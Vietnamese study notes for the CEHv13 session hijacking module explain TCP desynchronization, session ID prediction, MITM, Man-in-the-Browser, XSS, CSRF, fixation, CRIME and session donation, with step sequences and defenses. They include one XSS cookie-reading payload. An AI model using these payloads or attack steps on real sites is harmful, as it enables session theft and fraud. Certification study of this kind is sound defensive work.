### CEHv13 - Module 11 - Session Hijacking

## 1. Khái niệm Cướp phiên (Session Hijacking) [Trang 1547]

- **Cướp phiên (Session hijacking):** Là một cuộc tấn công trong đó kẻ tấn công chiếm quyền điều khiển một phiên giao tiếp Transmission Control Protocol (TCP) hợp lệ giữa hai máy tính.
- Vì hầu hết các loại xác thực chỉ được thực hiện ở thời điểm bắt đầu của một phiên TCP, kẻ tấn công có thể giành quyền truy cập vào máy tính trong khi phiên đang diễn ra.
- Nếu kẻ tấn công đánh cắp hoặc đoán được session ID hợp lệ, chúng có thể sử dụng nó để xác thực với máy chủ, và máy chủ sẽ phản hồi các yêu cầu của kẻ tấn công vì lầm tưởng rằng đang giao tiếp với người dùng hợp lệ.
- Kẻ tấn công có thể sử dụng kỹ thuật cướp phiên để khởi chạy nhiều loại hình tấn công khác nhau, chẳng hạn như Man-in-the-Middle (MITM) và Denial-of-Service (DoS). Chúng cũng có thể đánh hơi các thông tin nhạy cảm và làm gián đoạn phiên kết nối để thực hiện một cuộc tấn công DoS.

## 2. Tại sao cướp phiên thành công? (Why is Session Hijacking Successful?) [Trang 1548 - 1549]

Cướp phiên thành công nhờ vào các yếu tố lỗ hổng sau:

- **Không có cơ chế khóa tài khoản đối với session ID không hợp lệ:** Nếu trang web không khóa tài khoản, kẻ tấn công có thể thực hiện tấn công brute-force để thử liên tục các session ID cho đến khi tìm được ID hợp lệ mà không bị cảnh báo.
- **Thuật toán tạo session ID yếu hoặc kích thước session ID nhỏ:** Hầu hết các trang web dùng thuật toán tuyến tính (dựa trên thời gian hoặc IP) để tạo ID. Bằng cách nghiên cứu mô hình tuần tự, kẻ tấn công dễ dàng thu hẹp phạm vi tìm kiếm. Kể cả dùng thuật toán mạnh, nếu chuỗi ID quá ngắn thì vẫn rất dễ bị bẻ khóa.
- **Xử lý session ID không an toàn:** Kẻ tấn công có thể lừa trình duyệt truy cập trang web khác để lấy thông tin session ID được lưu trữ, sau đó khai thác qua DNS poisoning, XSS.
- **Thời gian timeout của phiên vô thời hạn (Indefinite session timeout):** Ví dụ như tùy chọn "Remember me" cung cấp cho kẻ tấn công thời gian không giới hạn để đoán session ID hoặc dùng ID tĩnh sau khi đánh cắp tệp cookie.
- **Hầu hết máy tính dùng TCP/IP đều dễ bị tổn thương:** Do các lỗi thiết kế vốn có của chính giao thức TCP/IP.
- **Hầu hết các biện pháp đối phó không hoạt động nếu không có mã hóa:** Rất dễ để đánh hơi (sniff) session ID trên một mạng phẳng (flat network) nếu bảo mật truyền tải không được thiết lập đúng cách, ngay cả khi web dùng mã hóa SSL.

## 3. Các pha của cướp phiên (Phases of Session Hijacking) [Trang 1551 - 1552]

Quá trình cướp phiên được chia thành ba giai đoạn chính:

- **Theo dõi kết nối (Tracking the connection):** Kẻ tấn công dùng network sniffer để theo dõi nạn nhân, hoặc dùng công cụ như Nmap để quét mạng tìm mục tiêu có chuỗi TCP dễ dự đoán. Sau đó, chúng chụp lại các số thứ tự (sequence number) và số xác nhận (acknowledgment number - ACK).
- **Phá đồng bộ kết nối (Desynchronizing the connection):** Xảy ra khi số thứ tự của máy chủ không khớp với số ACK của máy khách. Để thực hiện, kẻ tấn công gửi dữ liệu null (null data) đến máy chủ để làm tăng số SEQ/ACK của máy chủ mà máy khách không biết. Một cách khác là gửi cờ đặt lại (RST flag) hoặc cờ kết thúc (FIN flag) để ngắt kết nối phía máy chủ và tạo một kết nối mới với số thứ tự khác, đưa cả hai vào trạng thái mất đồng bộ nhưng vẫn được thiết lập.
  - **Sử dụng cờ RST:** Kẻ tấn công chờ gói SYN/ACK từ server gửi cho host. Khi phát hiện gói này, kẻ tấn công lập tức gửi một gói RST và một gói SYN với các tham số giống hệt (như số cổng) nhưng với số thứ tự khác cho server. Server nhận được gói RST sẽ đóng kết nối với mục tiêu và khởi tạo một kết nối mới dựa trên gói SYN với số thứ tự mới trên cùng cổng. Sau khi mở kết nối mới, server gửi gói SYN/ACK cho mục tiêu để xác nhận. Kẻ tấn công phát hiện gói này (không cần chặn) và gửi gói ACK cho server. Lúc này, server ở trạng thái ESTABLISHED (đã thiết lập). Mục đích là để mục tiêu vẫn duy trì giao tiếp và chuyển sang trạng thái ESTABLISHED khi nhận được gói SYN/ACK đầu tiên từ server. Hậu quả là cả server và mục tiêu đều ở trạng thái ESTABLISHED nhưng bị mất đồng bộ.
  - **Sử dụng cờ FIN:** Kẻ tấn công cũng có thể dùng cờ FIN, nhưng điều này sẽ khiến server phản hồi bằng gói ACK, làm lộ cuộc tấn công thông qua hiện tượng "bão ACK" (ACK storm). Sự không khớp trong các số SEQ/ACK dẫn đến lưu lượng mạng dư thừa khi cả server và mục tiêu đều cố gắng xác minh đúng số thứ tự. Vì các gói tin này không mang dữ liệu, việc truyền lại sẽ không xảy ra nếu gói bị mất. Tuy nhiên, vì TCP sử dụng IP, việc mất một gói tin duy nhất sẽ kết thúc cuộc hội thoại không mong muốn giữa server và mục tiêu.
  - **Lưu ý về bước phá đồng bộ:** Kẻ tấn công có thể thêm bước phá đồng bộ vào chuỗi tấn công cướp phiên để đánh lừa host mục tiêu. Nếu không phá đồng bộ, kẻ tấn công tiêm dữ liệu vào server trong khi vẫn giấu danh tính bằng cách giả mạo địa chỉ IP. Tuy nhiên, kẻ tấn công phải đảm bảo rằng server cũng phản hồi lại host mục tiêu.
- **Tiêm gói tin của kẻ tấn công (Injecting attacker's packet):** Sau khi ngắt kết nối giữa máy chủ và mục tiêu, kẻ tấn công có thể tiêm dữ liệu vào mạng hoặc tích cực tham gia như một kẻ trung gian (Man-in-the-Middle - MITM), đọc và tiêm dữ liệu theo ý muốn.

## 4. Phân tích gói tin trong cướp phiên cục bộ (Packet Analysis of a Local Session Hijack) [Trang 1552]

- Cướp phiên liên quan đến việc khai thác quá trình bắt tay ba bước (three-way handshake) của TCP.
- Để cướp phiên thành công, kẻ tấn công cần biết số thứ tự tiếp theo (Next Sequence Number - NSN) mà máy khách sẽ sử dụng.
- Có hai cách: Một là bắt (sniff) lưu lượng mạng, tìm gói ACK và xác định NSN dựa trên gói đó (cách này gọi là cướp phiên cục bộ - local session hijacking). Hai là truyền dữ liệu với số thứ tự tự đoán (phương pháp này không đáng tin cậy).

## 5. Phân loại cướp phiên (Types of Session Hijacking) [Trang 1552 - 1553]

- **Cướp phiên thụ động (Passive Session Hijacking):** Kẻ tấn công chỉ quan sát và ghi lại tất cả lưu lượng thông qua network sniffers để thu thập session IDs và mật khẩu. Sau đó chúng dùng thông tin này để đăng nhập hợp lệ.
- **Cướp phiên chủ động (Active Session Hijacking):** Kẻ tấn công chiếm đoạt một phiên hiện có bằng cách ngắt kết nối một phía hoặc tích cực tham gia (ví dụ: MITM attack). Để MITM thành công, kẻ tấn công đôi khi phải đoán được số thứ tự trước khi mục tiêu trả lời máy chủ.

## 6. Cướp phiên trong Mô hình OSI (Session Hijacking in OSI Model) [Trang 1554]

Có hai cấp độ cướp phiên trong mô hình OSI:

- **Cướp phiên cấp mạng (Network-Level Hijacking):** Là việc đánh interception các gói tin trong quá trình truyền tải giữa client và server trong một phiên TCP/UDP. Một cuộc tấn công thành công cung cấp cho kẻ tấn công những thông tin quan trọng để tiếp tục tấn công các phiên cấp ứng dụng. Điểm nguy hiểm là nó tập trung vào luồng dữ liệu của giao thức nên không cần phải tinh chỉnh chi tiết cho từng ứng dụng web.
- **Cướp phiên cấp ứng dụng (Application-Level Hijacking):** Đạt được quyền kiểm soát phiên người dùng HTTP bằng cách đánh cắp các session IDs. Nhờ đó, kẻ tấn công kiểm soát phiên hiện tại hoặc tạo các phiên trái phép mới. Thông thường, cả hai cuộc tấn công cấp mạng và cấp ứng dụng thường đi kèm với nhau.

## 7. Giả mạo (Spoofing) vs. Chiếm quyền (Hijacking) [Trang 1555 - 1556]

- **Giả mạo (Spoofing):** Kẻ tấn công mạo danh người dùng hoặc máy khác để giành quyền truy cập. Kẻ tấn công không chiếm quyền phiên đang hoạt động mà khởi tạo một phiên kết nối hoàn toàn mới bằng thông tin đăng nhập bị đánh cắp của nạn nhân. (Cần có quyền root để tạo các gói tin thô).
- **Chiếm (Hijacking):** Kẻ tấn công giành quyền kiểm soát một phiên đang hoạt động (existing active session). Quá trình này phụ thuộc vào việc người dùng hợp pháp đã thiết lập kết nối và xác thực từ trước.
  - Lưu ý về các hạn chế (Limitations): Các cuộc tấn công giả mạo địa chỉ IP chỉ có thể thành công nếu hệ thống sử dụng IP để xác thực. Kẻ tấn công sẽ không thể thực hiện IP spoofing hoặc session hijacking nếu mạng có triển khai kiểm tra tính toàn vẹn trên từng gói tin (per-packet integrity checking). Tương tự, các cuộc tấn công này cũng bất khả thi nếu phiên kết nối sử dụng các phương pháp mã hóa như Secure Sockets Layer (SSL) hoặc Point-to-Point Tunneling Protocol (PPTP) vì kẻ tấn công không thể tham gia vào quá trình trao đổi khóa (key exchange).
    - **Blind session hijacking (Cướp phiên mù):** Để hiểu cướp phiên mù, điều quan trọng là phải hiểu khả năng dự đoán số thứ tự. Các số thứ tự TCP cung cấp kiểm soát luồng và tính toàn vẹn dữ liệu. Các phân đoạn TCP cung cấp Số thứ tự khởi tạo (ISN) không bắt đầu từ số 0 cho mỗi phiên. Nền tảng của cướp phiên mù dựa trên khả năng dự đoán hoặc đoán các số thứ tự của kẻ tấn công. Kẻ tấn công không thể giả mạo một host đáng tin cậy trên một mạng khác và quan sát các gói tin trả lời vì không có tuyến đường (route) nào để các gói tin quay lại địa chỉ IP của kẻ tấn công. Hơn nữa, kẻ tấn công không thể đầu độc bộ nhớ cache ARP vì các bộ định tuyến không phát sóng ARP qua Internet. Do không thể quan sát phản hồi, kẻ tấn công phải đoán trước các phản hồi từ nạn nhân và ngăn chặn host gửi gói TCP/RST cho nạn nhân. Phương pháp này đặc biệt hữu ích khi khai thác mối quan hệ tin cậy giữa người dùng và các máy từ xa.
    - **So sánh Spoofing và Hijacking:**
      - Trong trường hợp IP spoofing mà không có cướp phiên, việc đoán số thứ tự là không cần thiết vì không có phiên nào đang mở hiện tại với địa chỉ IP đó.
      - Trong một cuộc cướp phiên, lưu lượng chỉ quay lại kẻ tấn công nếu sử dụng "định tuyến nguồn" (source routing) - tức là người gửi chỉ định tuyến đường mà gói IP phải đi đến đích, sau đó kẻ tấn công đánh hơi (sniffs) lưu lượng khi nó đi qua máy mình.
      - Trong "spoofing phiên", thông tin xác thực bắt được sẽ dùng để thiết lập một phiên mới. Ngược lại, "cướp phiên chủ động" (active hijacking) sẽ làm lu mờ một phiên đã tồn tại từ trước. Hậu quả là người dùng hợp pháp có thể mất quyền truy cập hoặc chức năng bình thường của phiên làm việc (ví dụ: Telnet) vì kẻ tấn công đã cướp phiên và hành động với các đặc quyền của họ. Do hầu hết các cơ chế xác thực chỉ được thực thi lúc bắt đầu phiên, kẻ tấn công có thể dễ dàng truy cập vào máy mục tiêu mà không cần xác thực khi phiên đang diễn ra.

## 8. Cướp phiên cấp ứng dụng (Application-Level Hijacking) [Trang 1558 - 1559]

Nhằm giành quyền kiểm soát phiên người dùng HTTP bằng cách lấy các session IDs. Có 3 kỹ thuật chính:

- **Đánh cắp (Stealing):** Dùng các kỹ thuật vật lý hoặc dùng công cụ sniffing (như Wireshark, Riverbed Packet Analyzer Plus) để chặn lưu lượng giữa client và server nhằm trích xuất session IDs từ các gói tin.
- **Đoán (Guessing):** Cố gắng đoán session IDs bằng cách quan sát các biến của phiên. Chỉ hiệu quả khi máy chủ dùng cơ chế tạo ID yếu hoặc có nhiều lỗ hổng.
- **Brute forcing:** Thử tất cả các hoán vị có thể có của session ID. Dùng kết nối DSL, kẻ tấn công có thể tạo tới 1.000 lần đoán mỗi giây.
- _(Bổ sung thêm từ nguồn)_ Các cách khác để xâm phạm token phiên bao gồm: Predictable session token, MITM, Man-in-the-browser, XSS, CSRF, Session replay, Session fixation, CRIME, Forbidden attack, Session donation, PetitPotam hijacking.

## 8. Session Sniffing (Đánh hơi phiên) [Trang 1560]

- Máy chủ web thường gửi token phiên cho trình duyệt client. Token này là chuỗi có độ dài thay đổi nằm trong header của yêu cầu HTTP (cookie), trong URL, hoặc trong nội dung body của HTTP request.
- Kẻ tấn công dùng công cụ sniffing để bắt gói tin, trích xuất ID, giả mạo nạn nhân và gửi ID đó cho máy chủ trước nạn nhân để chiếm phiên.

## 9. Dự đoán token phiên (Predicting Session Token) [Trang 1561 - 1563]

Kẻ tấn công thu thập lượng lớn session ID cùng lúc, phân tích thuật toán và dự đoán token mới:

- **Token tuần tự (Sequential tokens):** Nếu ID được phát hành theo số thứ tự (vd: 1001, 1002), kẻ tấn công dễ dàng đoán token tiếp theo là 1003.
- **Token dựa vào timestamp (Timestamp-based tokens):** Kết hợp các yếu tố dễ dự đoán như thời gian. Nếu biết định dạng và ngày giờ hiện tại, kẻ tấn công có thể đoán được (Ví dụ: `user123-20240611T1234`).
- **Không gian token nhỏ (Small token space):** Nếu số lượng token có thể có là quá nhỏ (vd: giới hạn 10.000 giá trị), kẻ tấn công có thể viết script brute-force toàn bộ.
- **Thiếu giới hạn tốc độ (Lack of rate-limiting):** Không có rate-limiting cho phép kẻ tấn công thực hiện đoán (brute-force) hàng ngàn token liên tục mà không bị hệ thống chặn.
- **Bộ sinh số ngẫu nhiên yếu (Weak PRNG):** Bộ tạo số giả ngẫu nhiên không thực sự ngẫu nhiên hoặc được tạo seed (hạt giống) kém, ví dụ như dùng thời gian hiện tại làm seed, sẽ giúp kẻ tấn công sao chép lại quy trình tạo token.
- **Các bước thực hiện tấn công bằng kỹ thuật Brute-force / Dự đoán token [Trang 1563]:**
  1. Kẻ tấn công thu thập Session ID hiện tại và kết nối với ứng dụng web.
  2. Kẻ tấn công áp dụng kỹ thuật brute-force hoặc tính toán Session ID tiếp theo.
  3. Kẻ tấn công sửa đổi giá trị hiện tại trong cookie/URL/trường biểu mẫu ẩn và giả mạo danh tính của người dùng tiếp theo.

## 10. Cướp phiên bằng Man-in-the-Middle (MITM) [Trang 1564]

- Trong MITM, kẻ tấn công chia rẽ (split) kết nối TCP thành hai kết nối riêng biệt: `client ↔ attacker` và `attacker ↔ server`.
- Sau khi chặn thành công, kẻ tấn công có thể đọc, sửa đổi và chèn dữ liệu gian lận vào phiên giao tiếp.
- Trong một giao dịch HTTP, bản thân kết nối TCP chính là mục tiêu để thực hiện cuộc tấn công xâm nhập này.

## 11. Tấn công Man-in-the-Browser / Manipulator-in-the-Browser (MitB) [Trang 1565 - 1566]

Tấn công Man-in-the-browser (MitB) tương tự như tấn công Man-in-the-Middle (MITM), nhưng điểm khác biệt là nó sử dụng một Trojan horse để chặn và thao túng các lệnh gọi (calls) giữa trình duyệt và các cơ chế/thư viện bảo mật của nó [Trang 1565]. Mục tiêu chính là trộm cắp tài chính bằng cách thao túng các giao dịch ngân hàng trực tuyến. MitB có thể thành công ngay cả khi có SSL, PKI hay xác thực 2 yếu tố (2FA) vì mọi cơ chế bảo mật đều trông có vẻ hoạt động bình thường [Trang 1565].

Các bước thực hiện tấn công Man-in-the-Browser [Trang 1565 - 1566]:

1. Trojan lây nhiễm vào phần mềm của máy tính (Hệ điều hành hoặc ứng dụng).
2. Trojan cài đặt mã độc (các tệp tiện ích mở rộng - extension files) và lưu nó vào cấu hình trình duyệt.
3. Sau khi người dùng khởi động lại trình duyệt, mã độc dưới dạng extension được tải lên.
4. Các file extension đăng ký một trình xử lý (handler) cho mỗi lần người dùng truy cập một trang web.
5. Khi một trang được tải, extension so khớp URL của trang đó với danh sách các trang web mục tiêu (targeted sites) đã được thiết lập sẵn.
6. Người dùng đăng nhập an toàn vào trang web (ví dụ: web ngân hàng).
7. Extension đăng ký một event handler cho nút bấm (button) khi phát hiện một mẫu tải trang cụ thể.
8. Khi người dùng nhấp vào nút bấm, extension sử dụng giao diện DOM (Document Object Model) để trích xuất toàn bộ dữ liệu từ các trường biểu mẫu (form fields) và sửa đổi các giá trị đó (ví dụ: đổi tài khoản thụ hưởng).
9. Trình duyệt gửi biểu mẫu và các giá trị đã sửa đổi tới server.
10. Server nhận các giá trị đã sửa đổi nhưng không thể phân biệt được đâu là giá trị gốc.
11. Sau khi server thực hiện giao dịch, một biên lai (receipt) được tạo ra.
12. Trình duyệt nhận lại biên lai cho giao dịch đã bị sửa đổi.
13. Tuy nhiên, trình duyệt (đã bị kiểm soát) lại hiển thị biên lai với các thông tin gốc ban đầu do người dùng nhập.
14. Người dùng hoàn toàn tin rằng giao dịch gốc đã được xử lý mà không biết gì về sự thay đổi/can thiệp.

## 12. Cướp phiên cấp ứng dụng (Application-Level Session Hijacking) và các phương pháp tấn công Client-side [Trang 1566 - 1580]

- **Đặc điểm của tấn công Client-side (Client-side Attacks):** Nhắm vào các lỗ hổng trong ứng dụng máy khách khi chúng tương tác với máy chủ độc hại hoặc xử lý dữ liệu độc hại. Các ứng dụng dễ bị tổn thương bao gồm các trang web không được bảo vệ, Java Runtime Environment (JRE) và trình duyệt (mục tiêu chính). Tấn công chỉ xảy ra khi máy khách thiết lập kết nối với máy chủ độc hại và xử lý dữ liệu từ chúng; nếu không có sự tương tác giữa client và server, tấn công sẽ không thể xảy ra (Ví dụ: Chạy ứng dụng FTP client nhưng không thiết lập kết nối tới FTP server).

- **Cross-Site Scripting (XSS)** [Trang 1566 - 1567]:
  - Bản chất: Kẻ tấn công chèn các tập lệnh phía máy khách (client-side scripts) độc hại vào các trang web động do ứng dụng web không xử lý đầu vào đúng cách.
  - Cách thức: Tập lệnh độc hại thực thi trên trình duyệt của nạn nhân để thu thập thông tin cá nhân, đánh cắp cookie/session token. Ví dụ mã chèn: `<SCRIPT>alert(document.cookie);</SCRIPT>`.
- **Malicious JavaScript (Mã JS độc hại)** [Trang 1566]:
  - Bản chất: Kẻ tấn công nhúng một kịch bản JS độc hại vào trang web.
  - Cách thức: Kịch bản này không tạo ra bất kỳ cảnh báo nào cho người dùng nhưng âm thầm chụp (captures) các token phiên ở chế độ nền và gửi chúng cho kẻ tấn công.
- **Trojans** [Trang 1566]:
  - Bản chất: Phần mềm độc hại lây nhiễm vào hệ thống nạn nhân.
  - Cách thức: Một Trojan horse có thể thay đổi cài đặt proxy trong trình duyệt của người dùng để gửi tất cả các phiên (sessions) đi qua máy của kẻ tấn công, từ đó đánh cắp dữ liệu.
- **Cross-Site Request Forgery (CSRF)** [Trang 1568]:
  - Bản chất: Còn được gọi là tấn công một cú nhấp chuột (one-click attack) hoặc session riding. Khai thác sự tin tưởng mà máy chủ (server) dành cho một phiên đang xác thực của trình duyệt.
  - Cách thức: Kẻ tấn công tạo một biểu mẫu độc hại. Khi nạn nhân (đã đăng nhập) bấm vào liên kết, trình duyệt tự động gửi dữ liệu hợp lệ (cookie) tới máy chủ. Vì dữ liệu xuất phát từ người dùng đáng tin cậy, máy chủ chấp nhận yêu cầu của kẻ tấn công.
- **Session Replay Attack (Tấn công phát lại phiên)** [Trang 1569 - 1570]:
  - Bản chất: Ghi lại và phát lại token.
  - Cách thức: Kẻ tấn công lắng nghe (eavesdrops/sniffs) cuộc hội thoại giữa người dùng và máy chủ để chụp (capture) token xác thực. Sau đó, chúng phát lại (replays) yêu cầu chứa token đó tới máy chủ để qua mặt xác thực và giành quyền truy cập trái phép.
- **Session Fixation (Cố định phiên)** [Trang 1571 - 1573]:
  - Bản chất: Đặt trước (fix) một Session ID hợp lệ thay vì đánh cắp ID sau khi đăng nhập.
  - Cách thức: Kẻ tấn công lấy một ID hợp lệ từ server, gài ID này vào trình duyệt nạn nhân (qua URL, cookie, form ẩn) và dụ nạn nhân đăng nhập. Khi nạn nhân đăng nhập thành công, phiên đó được xác thực với ID mà kẻ tấn công đã biết từ trước.
  - **Các giai đoạn của một cuộc tấn công cố định phiên (Session Fixation phases):**
    1. **Giai đoạn thiết lập (Session set-up phase):** Kẻ tấn công kết nối với máy chủ web mục tiêu để nhận một session ID hợp lệ. (Kẻ tấn công có thể phải gửi request liên tục để giữ cho session ID này không bị hết hạn/timeout).
    2. **Giai đoạn cố định (Fixation phase):** Kẻ tấn công đưa session ID này vào trình duyệt của nạn nhân (thông qua link URL, hidden form, v.v.).
    3. **Giai đoạn xâm nhập (Entrance phase):** Kẻ tấn công chờ nạn nhân đăng nhập vào máy chủ bằng session ID đã gài bẫy, sau đó chiếm quyền sử dụng phiên đó.
- **Proxy-based Session Hijacking (Cướp phiên qua Proxy)** [Trang 1574]:
  - Bản chất: Đánh cắp phiên bằng cách đóng vai trò trung gian.
  - Cách thức: Kẻ tấn công dụ nạn nhân nhấp vào một liên kết giả (bogus link) chuyển hướng đến máy chủ của chúng. Kẻ tấn công hoạt động như một proxy, chuyển tiếp yêu cầu đến máy chủ hợp pháp và chụp (captures) toàn bộ thông tin phiên trong quá trình giao dịch.
- **CRIME Attack** [Trang 1575 - 1576]:
  - Bản chất: Compression Ratio Info-Leak Made Easy - rò rỉ dữ liệu qua nén.
  - Cách thức: Khai thác lỗ hổng trong tính năng nén dữ liệu (thuật toán DEFLATE) của các giao thức SSL/TLS, SPDY và HTTPS. Kẻ tấn công tiêm ký tự ngẫu nhiên, theo dõi độ dài/kích thước cookie được mã hóa để suy đoán giá trị thực sự của authentication cookie.
    1. Kẻ tấn công sử dụng các kỹ thuật Kỹ nghệ xã hội (Social Engineering) để lừa nạn nhân nhấp vào một liên kết độc hại, từ đó tiêm mã độc vào hệ thống hoặc chuyển hướng nạn nhân đến một trang web lừa đảo.
    2. Nếu nạn nhân đã thiết lập sẵn kết nối HTTPS với một ứng dụng web bảo mật, kẻ tấn công sẽ đánh hơi (sniff) lưu lượng HTTPS của nạn nhân bằng các kỹ thuật như ARP spoofing.
    3. Thông qua việc đánh hơi, kẻ tấn công bắt được giá trị cookie từ các thông điệp HTTPS.
    4. Kẻ tấn công gửi nhiều yêu cầu HTTPS đến ứng dụng web với cookie đó được gắn thêm (prepended) một vài ký tự ngẫu nhiên.
    5. Sau đó, kẻ tấn công giám sát lưu lượng giữa nạn nhân và ứng dụng web để thu thập giá trị đã nén và mã hóa của cookie.
    6. Kẻ tấn công phân tích độ dài của cookie và dự đoán giá trị thực sự của cookie xác thực, từ đó mạo danh nạn nhân để đánh cắp các thông tin mật (như thẻ tín dụng, mật khẩu).
    - **Công cụ khai thác:** Kẻ tấn công thường sử dụng công cụ như **CrimeCheck** để phát hiện xem máy chủ web có bật TLS hay nén HTTP hay không, từ đó xác định mục tiêu có dễ bị tổn thương bởi CRIME attack hay không.
- **FREAK / Forbidden Attack** [Trang 1577 - 1578]:
  - Bản chất: Tấn công MITM phá vỡ mã hóa TLS.
  - Cách thức: Khai thác lỗ hổng tái sử dụng nonce mật mã (cryptographic nonce reuse) trong quá trình bắt tay TLS (đặc biệt mã hóa AES-GCM). Sau khi chiếm được phiên HTTPS, kẻ tấn công tiêm mã độc (JS) hoặc nội dung giả mạo để ép nạn nhân tiết lộ thông tin nhạy cảm.
  - **Các bước thực hiện tấn công Forbidden (A forbidden attack involves the following steps):**
    1. Kẻ tấn công giám sát kết nối giữa nạn nhân và máy chủ web, sau đó đánh hơi (sniffs) nonce từ các thông điệp bắt tay TLS.
    2. Kẻ tấn công tạo các khóa xác thực bằng cách sử dụng nonce và chiếm quyền điều khiển kết nối.
    3. Toàn bộ lưu lượng giữa nạn nhân và máy chủ web sẽ chảy qua máy của kẻ tấn công.
    4. Kẻ tấn công tiêm mã JavaScript hoặc các trường web (web fields) vào luồng truyền tải hướng tới nạn nhân.
    5. Nạn nhân tiết lộ các thông tin nhạy cảm như số tài khoản ngân hàng, mật khẩu và số an sinh xã hội cho kẻ tấn công.
- **Session Donation Attack (Tấn công quyên tặng phiên)** [Trang 1579 - 1580]:
  - Bản chất: Nạn nhân xác thực vào phiên của kẻ tấn công.
  - Cách thức: Kẻ tấn công tự đăng nhập để lấy Session ID hợp lệ, sau đó "quyên tặng" (donate) ID này cho nạn nhân qua một liên kết. Khi nạn nhân nhấp vào và nhập thông tin (thanh toán, mật khẩu), chi tiết đó sẽ bị liên kết/ghép nối trực tiếp vào tài khoản của kẻ tấn công.
  - **Các bước thực hiện tấn công Session Donation:**
    1. Đầu tiên, kẻ tấn công đăng nhập vào một dịch vụ, thiết lập kết nối hợp pháp với máy chủ web đích và xóa các thông tin được lưu trữ.
    2. Máy chủ web đích phát hành một Session ID cho kẻ tấn công.
    3. Sau đó, kẻ tấn công "quyên tặng" (donates) Session ID của chúng cho nạn nhân và dụ nạn nhân nhấp vào nó để truy cập trang web.
    4. Nạn nhân nhấp vào liên kết, tin rằng đó là liên kết hợp pháp. Quá trình này mở trang của máy chủ trong trình duyệt của nạn nhân với Session ID của kẻ tấn công. Cuối cùng, nạn nhân nhập thông tin của họ vào trang và lưu lại.
    5. Kẻ tấn công lúc này có thể đăng nhập bằng chính tài khoản của chúng và lấy được toàn bộ thông tin của nạn nhân.

## 13. Ghi nhớ (Memorization)

(Lưu ý: Bảng ghi nhớ này đúc kết quy luật tương quan giữa các phương thức tấn công để dễ dàng ghi nhớ cách thức hoạt động)

- **CODE** (Mã độc) → XSS, Malicious JS _(Tiêm mã thực thi vào trình duyệt)_
- **TRUST** (Niềm tin) → CSRF, Session Donation _(Lợi dụng sự tin tưởng của máy chủ vào trình duyệt hoặc đánh lừa luồng xác thực)_
- **REUSE** (Tái sử dụng) → Replay, Fixation _(Sử dụng lại token đã bắt được hoặc ép dùng lại token đã cố định trước)_
- **NETWORK** (Mạng lưới/Trung gian) → Proxy, CRIME _(Đứng giữa can thiệp mạng hoặc phân tích gói tin bị nén)_
- **CRYPTO** (Mã hóa) → FREAK / Forbidden _(Khai thác sự yếu kém trong thuật toán mã hóa, tái sử dụng Nonce)_

| Attack                                | Ý tưởng chính (1 dòng)                   | Cách thức (tóm tắt)                                                     | Yêu cầu chính                  | Từ khoá kỳ thi CEH                    | Phòng chống                                       |
| ------------------------------------- | ---------------------------------------- | ----------------------------------------------------------------------- | ------------------------------ | ------------------------------------- | ------------------------------------------------- |
| **Cross-Site Scripting (XSS)**        | Chèn JS để đánh cắp cookie phiên         | Script độc thi hành trong trình duyệt nạn nhân và đọc `document.cookie` | Xử lý input kém                | **Client-side code execution**        | Xác thực input, mã hoá output, `HttpOnly` cookies |
| **Malicious JavaScript**              | JS đánh cắp hoặc chuyển tiếp token       | JS trích token và gửi về kẻ tấn công                                    | Có vector chèn script          | **Session token exfiltration**        | CSP, sanitization, `HttpOnly`                     |
| **Trojan**                            | Malware đánh cắp dữ liệu phiên           | Trojan đọc bộ nhớ trình duyệt hoặc cookie                               | Hệ thống nạn nhân bị nhiễm     | **Client compromise**                 | AV, bảo mật endpoint                              |
| **Cross-Site Request Forgery (CSRF)** | Lợi dụng session đã xác thực             | Nạn nhân bấm link → trình duyệt gửi cookie hợp lệ tự động               | Người dùng đã đăng nhập        | **One-click attack / Session riding** | Token chống CSRF, `SameSite` cookies              |
| **Session Replay Attack**             | Ghi lại & phát lại token                 | Kẻ tấn công sniff traffic và replay request được ghi                    | Cho phép tái sử dụng token     | **Replay authentication**             | TLS, nonce, token hết hạn                         |
| **Session Fixation**                  | Đặt trước session ID                     | Nạn nhân đăng nhập bằng session ID do attacker gán                      | Session ID không đổi sau login | **Pre-authentication session ID**     | Sinh lại session ID sau khi login                 |
| **Proxy-based Session Hijacking**     | Đánh cắp phiên qua proxy giả             | Nạn nhân kết nối qua proxy do attacker điều khiển                       | Người dùng tin proxy           | **Man-in-the-Browser**                | HTTPS, kiểm tra chứng chỉ                         |
| **CRIME Attack**                      | Rò rỉ dữ liệu qua nén                    | Lợi dụng tỉ lệ nén TLS/HTTP để suy đoán cookie                          | Bật TLS compression            | **Compression side-channel**          | Tắt TLS compression                               |
| **FREAK / Forbidden Attack**          | Phá yếu TLS / tái sử dụng crypto         | MITM ép downgrade hoặc tái sử dụng nonce (ví dụ AES-GCM)                | Cấu hình TLS yếu               | **TLS downgrade / nonce reuse**       | Sử dụng cipher mạnh, hardening TLS                |
| Session Donation Attack               | Nạn nhân xác thực vào phiên của attacker | Attacker đăng nhập → nạn nhân click → attacker nhận quyền               | Session bị ghép nối            | **Session misbinding**                | Gắn session với user/IP/device                    |

## 14. Cướp phiên cấp mạng (Network-Level Session Hijacking) [Trang 1581 - 1590]

Tấn công cấp mạng dựa trên việc chặn các gói tin giữa client và server trong phiên TCP hoặc UDP. Ưu điểm là không yêu cầu quyền truy cập host và không cần điều chỉnh theo từng ứng dụng. Các kỹ thuật khai thác lỗ hổng (đặc biệt trong quá trình three-way handshake) bao gồm:

- **Quá trình Bắt tay 3 bước của TCP (Three-way Handshake)** [Trang 1582 - 1583]: Để hiểu cách cướp phiên cấp mạng hoạt động, cần nắm rõ quy trình bắt tay 3 bước của TCP:
  - Client khởi tạo kết nối bằng cách gửi Gói tin có cờ SYN cùng Số thứ tự khởi tạo (ISN) của nó. (Trạng thái: SYN-SENT).
  - Server phản hồi bằng Gói tin có cờ SYN + ACK, xác nhận số thứ tự của Client và gửi kèm ISN của chính Server. (Trạng thái: SYN-RECEIVED).
  - Client gửi lại Gói ACK, tăng số thứ tự lên 1 để hoàn tất. (Trạng thái: ESTABLISHED).
  - _(Kẻ tấn công thường lợi dụng bước này: Bằng cách dự đoán chính xác Next Sequence Number (NSN), kẻ tấn công có thể chèn gói tin giả mạo vào luồng kết nối trước khi các bên hợp lệ kịp phản hồi)._

- **TCP/IP Hijacking** [Trang 1584 - 1585]:
  - Sử dụng các gói tin giả mạo (spoofed packets) để chiếm quyền kiểm soát kết nối.
  - Kẻ tấn công đánh hơi (sniffs) kết nối của nạn nhân và sử dụng IP của nạn nhân để gửi một gói tin giả mạo mang số thứ tự (sequence number) dự đoán được.
